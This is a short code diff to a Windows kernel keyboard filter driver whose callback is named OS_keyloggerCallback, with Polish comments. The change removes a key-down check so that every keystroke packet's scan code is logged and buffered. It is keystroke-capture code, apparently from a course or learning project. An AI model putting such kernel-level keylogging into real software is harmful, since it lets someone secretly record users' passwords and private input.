@@ -231,11 +231,6 @@ OS_keyloggerCallback(
     PKEYBOARD_INPUT_DATA currentPacket;
 
     for (currentPacket = InputDataStart; currentPacket < InputDataEnd; currentPacket++) {
-        BOOLEAN isKeyRelease = (currentPacket->Flags & KEY_BREAK) ? TRUE : FALSE;
-
-        if (!isKeyRelease)
-        {
-            // Logujemy tylko wciœniêcia (Key Down)
             DbgPrint("OS_keylogger: key pressed ScanCode: 0x%02X | Flags: 0x%X\n",
                 currentPacket->MakeCode,
                 currentPacket->Flags);
@@ -254,7 +249,6 @@ OS_keyloggerCallback(
             }
 
             WdfSpinLockRelease(driverContext->BufferLock);
-        }
     }
 
     //Wywo³anie nastêpnej funkcji
